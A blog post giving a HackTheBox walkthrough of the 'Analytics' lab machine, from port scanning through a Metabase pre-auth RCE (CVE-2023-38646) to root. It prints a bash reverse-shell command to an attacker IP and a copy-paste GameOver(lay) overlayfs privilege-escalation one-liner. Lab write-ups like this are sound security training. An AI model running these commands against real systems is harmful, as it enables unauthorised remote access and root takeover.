---
layout: post
title: Analytics writeup (HackTheBox)
author: wizarddos
category: writeups
excerpt_separator: <!--more-->
---

Hi there - that's my first Hack The box writeup.
Today, I'll cover [Analytics](https://app.hackthebox.com/machines/569) box.

So, off we go
<!--more-->
## Recon
First - I started rustscan
```
$ rustscan -a $IP
```
And it gave me 2 ports `22` and `80` - let's enumerate further
```
$ nmap -sC -sV -oN scan.txt $IP -p22,80    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-25 15:14 CET
Nmap scan report for 10.10.11.233
Host is up (0.033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We have also found a new domain - `http://analytical.htb/`
Add it to `/etc/hosts` with IP address 
```
$ sudo nano /etc/hosts
```
And then in new line
```
[Machine IP]      analytical.htb
```
Close editor with `Ctrl-X` and get to the site
## Website enumeration

In source code, we can see another subdomain - `data.analytical.htb`

Append it to `/etc/hosts` as well
```
$ echo "[Machine IP]    data.analytical.htb"
```

In there, we have **metabase** instance deployed
![Image of the login page](https://images.prismic.io/superpupertest/119ff6a6-3a33-47ba-a5ea-1fbe3c0ff516_metabase-login-page-in-browser.webp?auto=format&w=680&h=398.253&dpr=3)
(as for some reason, I can't access to this machine - Image comes from [Maddevs' writeup](https://maddevs.io/writeups/hackthebox-analytics/))
{: .subtext}

We don't need to brute-force the password - as there is one exploit for this particular version of metabase

**CVE-2023-38646**

You can get the exploit from [this Github repo](https://github.com/m3m0o/metabase-pre-auth-rce-poc)

As _Usage_ section says
> The script needs the target URL, the setup token and a command that will be executed. The setup token can be obtained through the /api/session/properties endpoint. Copy the value of the setup-token key.

So, we go to `http://data.analytical.htb/api/session/properties` and copy `setup-token` value

First, set up netcat listener so we can get reverse shell connection
```
$ nc -lvnp 2000
```
Then, we can utilize this exploit
```
$ python3 main.py -u http://data.analytical.htb -t [Your copied token] -c "bash -i 1>& /dev/tcp/[Your IP]/2000 0>&1"
```

When it's executed - in terminal with netcat, we should have operating shell

## Privilege escalation

We can't really run `sudo`, nor any `cronjobs` are present

Maybe enviromental variables?

```
$ env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=d0ca4e533c16
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/metabase.db
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
OLDPWD=/
```

We have 2 interesting values
```
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

Actually, this credentials can be used to log into SSH and exit the container we are in
```
$ ssh metalytics@analytical.htb
```

So, inside SSH we can find `user.txt` file
```
cat user.txt
[REDACTED]
```

### Getting Root

This system is vulnerable to **GameOver(lay)** exploit

It consists of **CVE-2023-2640** and **CVE-2023-32629**

If you want to know more - check [CrowdStrike publication](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/) about it

Right now, we can exploit it with simple payload
```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
```

(I didn't add thath `$` by default - so you can copy it)

Then, we should have root - get the flag

```
# cat /root/root.txt
[REDACTED]
```

And, that's it
Machine Pwned

## Conclusion

I hope this walkthrough helped you - I actually liked hacking this machine

I've learned new exploits and overall pracised my enumeration skills

So, that's it - see you next time